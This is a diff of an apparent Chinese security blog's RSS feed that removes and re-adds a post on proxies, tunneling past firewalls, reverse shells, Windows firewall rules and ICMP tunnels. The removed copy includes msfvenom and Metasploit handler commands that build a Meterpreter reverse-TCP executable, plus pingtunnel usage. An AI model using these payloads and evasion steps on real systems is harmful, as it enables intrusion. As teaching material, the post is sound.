@@ -704,102 +704,6 @@ find /etc/ -name passwd -exec grep -H &amp;quot;root&amp;quot; &amp;#123;&amp;#1
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://gyzero.shop/2023/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</guid>
-            <title>端口转发隧道代理</title>
-            <link>http://gyzero.shop/2023/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</link>
-            <pubDate>Sun, 12 Nov 2023 17:10:18 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173022003.png&#34; alt=&#34;image-20240316173022003&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;代理技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理技术&#34;&gt;#&lt;/a&gt; 代理技术&lt;/h3&gt;
-&lt;p&gt;代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端 “中间人” 的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。简单来说，代理技术解决的是网络之间的通信问题，如内网与外网之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。&lt;/p&gt;
-&lt;p&gt;图中两台内网中的主机是无法直接通信的，但是两台主机可以与公网的 vps 通信在公网 vps 上做代理转发把两台主机的流量转发给双方&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;建立连接&lt;/strong&gt;：首先，两台内网主机分别与公网 VPS 建立连接。这通常可以通过 SSH 或其他网络协议实现。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;设置代理&lt;/strong&gt;：在公网 VPS 上设置代理服务器，用于接收来自两台内网主机的请求，并将请求转发给另一台主机。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;数据转发&lt;/strong&gt;：当一台内网主机发送数据时，数据首先被发送到公网 VPS，然后由 VPS 将数据转发给另一台内网主机。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315195904305.png&#34; alt=&#34;image-20240315195904305&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;隧道技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隧道技术&#34;&gt;#&lt;/a&gt; 隧道技术&lt;/h3&gt;
-&lt;p&gt;隧道技术是一种网络通信策略，它允许不同网络的设备通过互联网进行安全的交流。简单来说，隧道技术解决了在网络通信中遇到的阻碍问题，例如绕过防火墙的过滤、处理网络连接和通讯问题，以及处理数据回链封装问题。有时候，我们发送的数据流量可能会被拦截，这时就需要利用隧道技术来绕过这种阻碍。隧道技术通过采用不同的协议，将本来无法通行的通信路径打通。在进入内部网络后，有些协议可能会被拦截，导致我们无法接收到目标设备的流量。这时，可以借助一些特殊的协议来建立隧道，以重新实现通信。&lt;/p&gt;
-&lt;p&gt;图中两台主机在同一个内网可以通信的，但是防火墙禁止了一些协议导致通过这些走的流量会被拦截导致无法通信，这时候就可以使用例如 icmp 等重新搭建一条路让流量走这里进行通信，但是不可以使用 http 因为 http 协议是基于 tcp 的&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316164019233.png&#34; alt=&#34;image-20240316164019233&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316171226537.png&#34; alt=&#34;image-20240316171226537&#34;&gt;&lt;/p&gt;
-&lt;h4 id=&#34;关于正反shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#关于正反shell&#34;&gt;#&lt;/a&gt; 关于正反 shell&lt;/h4&gt;
-&lt;p&gt;什么是正向 shell 反向 shell&lt;/p&gt;
-&lt;p&gt;正向就是攻击机主动去连接绑定的受害机的端口&lt;/p&gt;
-&lt;p&gt;反向就是让受害机主动来连接攻击机的指定端口&lt;/p&gt;
-&lt;p&gt;一般来讲对于防火墙入站规则是比出站规则严格的多，端口过滤的会很严格除非有没有被过滤且没有被占用的端口，这时就可以使用反弹 shell 进行上线，如果防火墙禁止了 TCP 出站，那么就需要使用其他协议来搭建隧道。&lt;/p&gt;
-&lt;h3 id=&#34;防火墙出入站规则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙出入站规则&#34;&gt;#&lt;/a&gt; 防火墙出入站规则&lt;/h3&gt;
-&lt;p&gt;防火墙上有出站和入站规则&lt;/p&gt;
-&lt;p&gt;出站规则就是本机去访问外网&lt;/p&gt;
-&lt;p&gt;例如一些软件需要去访问互联网上的资源&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203256799.png&#34; alt=&#34;image-20240315203256799&#34;&gt;&lt;/p&gt;
-&lt;p&gt;入站就是比如当前主机是一台 web 服务器用户来访问服务器上的网站&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203441398.png&#34; alt=&#34;image-20240315203441398&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Windows 防火墙提供了三种网络配置文件：域、专用和公用&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;域&lt;/strong&gt;：当设备已加入 Active Directory 域，并且可以访问域控制器时，会自动应用域网络配置文件这种网络位置类型无法手动设置&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;专用&lt;/strong&gt;：专用网络配置文件主要用于专用网络，如家庭网络或办公室网络管理员可以在网络接口上手动设置它&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;公用&lt;/strong&gt;：公用网络配置文件主要用于公共网络，如公共 Wi-Fi 网络或其他共享网络这是身份不明网络的默认配置文件&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203842956.png&#34; alt=&#34;image-20240315203842956&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203816409.png&#34; alt=&#34;image-20240315203816409&#34;&gt;&lt;/p&gt;
-&lt;h4 id=&#34;防火墙添加规则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙添加规则&#34;&gt;#&lt;/a&gt; 防火墙添加规则&lt;/h4&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315204831486.png&#34; alt=&#34;image-20240315204831486&#34;&gt;&lt;/p&gt;
-&lt;p&gt;程序设置就是电脑里的一些软件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315213822274.png&#34; alt=&#34;image-20240315213822274&#34;&gt;&lt;/p&gt;
-&lt;p&gt;指定的端口例如 80 端口 http，22ssh&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214021610.png&#34; alt=&#34;image-20240315214021610&#34;&gt;&lt;/p&gt;
-&lt;p&gt;自定义可以设置的更详细些&lt;/p&gt;
-&lt;p&gt;比如可以规定那些协议可以通过，应用于指定的 ip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214227534.png&#34; alt=&#34;image-20240315214227534&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214336145.png&#34; alt=&#34;image-20240315214336145&#34;&gt;&lt;/p&gt;
-&lt;p&gt;当前主机有一个 web 服务 80 端口 http, 不想让别人访问到就可以设置入站规则&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214551009.png&#34; alt=&#34;image-20240315214551009&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214620069.png&#34; alt=&#34;image-20240315214620069&#34;&gt;&lt;/p&gt;
-&lt;p&gt;规则开启时无法访问&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214721993.png&#34; alt=&#34;image-20240315214721993&#34;&gt;&lt;/p&gt;
-&lt;p&gt;规则关闭时则正常访问&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214830260.png&#34; alt=&#34;image-20240315214830260&#34;&gt;&lt;/p&gt;
-&lt;h4 id=&#34;命令行设置防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令行设置防火墙&#34;&gt;#&lt;/a&gt; 命令行设置防火墙&lt;/h4&gt;
-&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;netsh advfirewall show currentprofile #查看防火墙状态
-netsh advfirewall set allprofiles state on #开启防火墙
-netsh advfirewall set allprofiles state off #关闭防火墙
-netsh advfirewall firewall add rule name=&amp;quot;80off&amp;quot; dir=in action=block protocol=TCP localport=80 #禁止访问本地TCP协议80端口
-netsh advfirewall firewall add rule name=&amp;quot;80on&amp;quot; dir=in action=allow protocol=TCP localport=80 #允许访问本地TCP协议80
-netsh advfirewall firewall delete rule name=&amp;quot;80off&amp;quot; #删除名为80off的规则
-netsh advfirewall firewall show rule name=&amp;quot;http&amp;quot; #查看名为http的防火墙规则
-netsh advfirewall firewall add rule name=&amp;quot;22&amp;quot; dir=in protocol=tcp localport=22 action=block
-#阻止所有进入的 TCP 流量通过端口 22。
-netsh advfirewall firewall add rule name=&amp;quot;22on&amp;quot; dir=in protocol=tcp localport=22 action=allow
-#允许所有进入的 TCP 流量通过端口 22。
-https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/rules#官方文档
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&#34;域组策略控制防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#域组策略控制防火墙&#34;&gt;#&lt;/a&gt; 域组策略控制防火墙&lt;/h4&gt;
-&lt;p&gt;在一个域环境中，域控制器（Domain Controller）可以通过组策略（Group Policy）来管理和同步其下属主机的防火墙规则。这样，管理员就可以集中地管理网络环境中所有计算机的防火墙设置，而不需要在每台计算机上单独进行配置。&lt;/p&gt;
-&lt;p&gt;管理员可以在域控制器上创建和配置组策略对象（Group Policy Object，GPO），然后将这些 GPO 应用到一个或多个组织单位（Organizational Unit，OU）上。这些 OU 中的计算机将会自动接收并应用这些 GPO 中的设置，包括防火墙规则。&lt;/p&gt;
-&lt;p&gt;在域控组策略新建 GPO&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316152809739.png&#34; alt=&#34;image-20240316152809739&#34;&gt;&lt;/p&gt;
-&lt;p&gt;右键编辑打开策略里的防火墙设置&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153009887.png&#34; alt=&#34;image-20240316153009887&#34;&gt;&lt;/p&gt;
-&lt;p&gt;在另一台域内主机防火墙是关闭的&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153127674.png&#34; alt=&#34;image-20240316153127674&#34;&gt;&lt;/p&gt;
-&lt;p&gt;在域控这里设置防火墙属性把域防火墙设置为启动&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153220403.png&#34; alt=&#34;image-20240316153220403&#34;&gt;&lt;/p&gt;
-&lt;p&gt;右键点击强制会立刻启用该策略，或者使用 gpupdate/force 更新策略，或者主机重启后生效&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153403952.png&#34; alt=&#34;image-20240316153403952&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这时域控下属主机防火墙开启并且不可自己关闭必须由管理员设置&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155150999.png&#34; alt=&#34;image-20240316155150999&#34;&gt;&lt;/p&gt;
-&lt;p&gt;当然设置的防火墙规则也会同步下发到下属主机例如禁止 80 端口入站&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155851138.png&#34; alt=&#34;image-20240316155851138&#34;&gt;&lt;/p&gt;
-&lt;h3 id=&#34;icmp隧道&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#icmp隧道&#34;&gt;#&lt;/a&gt; ICMP 隧道&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173544717.png&#34; alt=&#34;image-20240316173544717&#34;&gt;&lt;/p&gt;
-&lt;p&gt;将 TCP 协议封装成 ICMP 协议&lt;/p&gt;
-&lt;p&gt;常见工具 Pingtunnel,icmpsh,spp&lt;/p&gt;
-&lt;h4 id=&#34;pingtunnel&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pingtunnel&#34;&gt;#&lt;/a&gt; Pingtunnel&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;https://github.com/esrrhs/pingtunnel&lt;/code&gt;&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;kali:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; windows/x64/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4343&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;127.0&lt;/span&gt;.0.1 &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; exe &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; msf.exe &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;use exploit/multi/handler&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;0.0&lt;/span&gt;.0.0&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;klai使用./pingtunnel &lt;span class=&#34;token parameter variable&#34;&gt;-type&lt;/span&gt; server 开启隧道&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;受害机:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</guid>
             <title>linux提权</title>
             <link>http://gyzero.shop/2023/11/10/network-security/neiwang/linux%E6%8F%90%E6%9D%83/linux%E6%8F%90%E6%9D%83/</link>
@@ -2639,6 +2543,295 @@ linux 操作系统&lt;br&gt;
  &lt;code&gt;cd /tmp/hosts/&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;#通过 chroot 切换 bash&lt;br&gt;
  &lt;code&gt;chroot ./ bash&lt;/code&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</guid>
+            <title>隧道代理</title>
+            <link>http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/</link>
+            <pubDate>Sat, 12 Nov 2022 17:10:18 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173022003.png&#34; alt=&#34;image-20240316173022003&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;代理技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代理技术&#34;&gt;#&lt;/a&gt; 代理技术&lt;/h3&gt;
+&lt;p&gt;代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端 “中间人” 的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。简单来说，代理技术解决的是网络之间的通信问题，如内网与外网之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。&lt;/p&gt;
+&lt;p&gt;图中两台内网中的主机是无法直接通信的，但是两台主机可以与公网的 vps 通信在公网 vps 上做代理转发把两台主机的流量转发给双方&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;建立连接&lt;/strong&gt;：首先，两台内网主机分别与公网 VPS 建立连接。这通常可以通过 SSH 或其他网络协议实现。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;设置代理&lt;/strong&gt;：在公网 VPS 上设置代理服务器，用于接收来自两台内网主机的请求，并将请求转发给另一台主机。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据转发&lt;/strong&gt;：当一台内网主机发送数据时，数据首先被发送到公网 VPS，然后由 VPS 将数据转发给另一台内网主机。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315195904305.png&#34; alt=&#34;image-20240315195904305&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;隧道技术&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#隧道技术&#34;&gt;#&lt;/a&gt; 隧道技术&lt;/h3&gt;
+&lt;p&gt;隧道技术是一种网络通信策略，它允许不同网络的设备通过互联网进行安全的交流。简单来说，隧道技术解决了在网络通信中遇到的阻碍问题，例如绕过防火墙的过滤、处理网络连接和通讯问题，以及处理数据回链封装问题。有时候，我们发送的数据流量可能会被拦截，这时就需要利用隧道技术来绕过这种阻碍。隧道技术通过采用不同的协议，将本来无法通行的通信路径打通。在进入内部网络后，有些协议可能会被拦截，导致我们无法接收到目标设备的流量。这时，可以借助一些特殊的协议来建立隧道，以重新实现通信。&lt;/p&gt;
+&lt;p&gt;图中两台主机在同一个内网可以通信的，但是防火墙禁止了一些协议导致通过这些走的流量会被拦截导致无法通信，这时候就可以使用例如 icmp 等重新搭建一条路让流量走这里进行通信，但是不可以使用 http 因为 http 协议是基于 tcp 的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316164019233.png&#34; alt=&#34;image-20240316164019233&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316171226537.png&#34; alt=&#34;image-20240316171226537&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;协议出网判断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#协议出网判断&#34;&gt;#&lt;/a&gt; 协议出网判断&lt;/h4&gt;
+&lt;p&gt;ICMP:ping 命令&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140551020.png&#34; alt=&#34;image-20240422140551020&#34;&gt;&lt;/p&gt;
+&lt;p&gt;DNS 协议：nslookup&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140907905.png&#34; alt=&#34;image-20240422140907905&#34;&gt;&lt;/p&gt;
+&lt;p&gt;SSH 隧道：ssh:root@192.168.0.123 22 端口&lt;/p&gt;
+&lt;h4 id=&#34;关于正反shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#关于正反shell&#34;&gt;#&lt;/a&gt; 关于正反 shell&lt;/h4&gt;
+&lt;p&gt;什么是正向 shell 反向 shell&lt;/p&gt;
+&lt;p&gt;正向就是攻击机主动去连接绑定的受害机的端口&lt;/p&gt;
+&lt;p&gt;反向就是让受害机主动来连接攻击机的指定端口&lt;/p&gt;
+&lt;p&gt;一般来讲对于防火墙入站规则是比出站规则严格的多，端口过滤的会很严格除非有没有被过滤且没有被占用的端口，这时就可以使用反弹 shell 进行上线，如果防火墙禁止了 TCP 出站，那么就需要使用其他协议来搭建隧道。&lt;/p&gt;
+&lt;h3 id=&#34;防火墙出入站规则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙出入站规则&#34;&gt;#&lt;/a&gt; 防火墙出入站规则&lt;/h3&gt;
+&lt;p&gt;防火墙上有出站和入站规则&lt;/p&gt;
+&lt;p&gt;出站规则就是本机去访问外网&lt;/p&gt;
+&lt;p&gt;例如一些软件需要去访问互联网上的资源&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203256799.png&#34; alt=&#34;image-20240315203256799&#34;&gt;&lt;/p&gt;
+&lt;p&gt;入站就是比如当前主机是一台 web 服务器用户来访问服务器上的网站&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203441398.png&#34; alt=&#34;image-20240315203441398&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Windows 防火墙提供了三种网络配置文件：域、专用和公用&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;域&lt;/strong&gt;：当设备已加入 Active Directory 域，并且可以访问域控制器时，会自动应用域网络配置文件这种网络位置类型无法手动设置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;专用&lt;/strong&gt;：专用网络配置文件主要用于专用网络，如家庭网络或办公室网络管理员可以在网络接口上手动设置它&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;公用&lt;/strong&gt;：公用网络配置文件主要用于公共网络，如公共 Wi-Fi 网络或其他共享网络这是身份不明网络的默认配置文件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203842956.png&#34; alt=&#34;image-20240315203842956&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203816409.png&#34; alt=&#34;image-20240315203816409&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;防火墙添加规则&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#防火墙添加规则&#34;&gt;#&lt;/a&gt; 防火墙添加规则&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315204831486.png&#34; alt=&#34;image-20240315204831486&#34;&gt;&lt;/p&gt;
+&lt;p&gt;程序设置就是电脑里的一些软件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315213822274.png&#34; alt=&#34;image-20240315213822274&#34;&gt;&lt;/p&gt;
+&lt;p&gt;指定的端口例如 80 端口 http，22ssh&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214021610.png&#34; alt=&#34;image-20240315214021610&#34;&gt;&lt;/p&gt;
+&lt;p&gt;自定义可以设置的更详细些&lt;/p&gt;
+&lt;p&gt;比如可以规定那些协议可以通过，应用于指定的 ip&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214227534.png&#34; alt=&#34;image-20240315214227534&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214336145.png&#34; alt=&#34;image-20240315214336145&#34;&gt;&lt;/p&gt;
+&lt;p&gt;当前主机有一个 web 服务 80 端口 http, 不想让别人访问到就可以设置入站规则&lt;/p&gt;
